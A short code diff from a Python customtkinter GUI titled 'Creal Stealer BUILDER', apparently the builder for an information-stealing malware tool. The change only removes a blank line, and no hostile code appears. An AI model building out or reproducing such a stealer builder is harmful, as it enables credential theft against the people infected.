@@ -5,7 +5,6 @@ from tkinter import messagebox, filedialog
 import webbrowser  # Import the webbrowser module
 import requests
 
-
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
 app.title(f"Creal Stealer BUILDER")
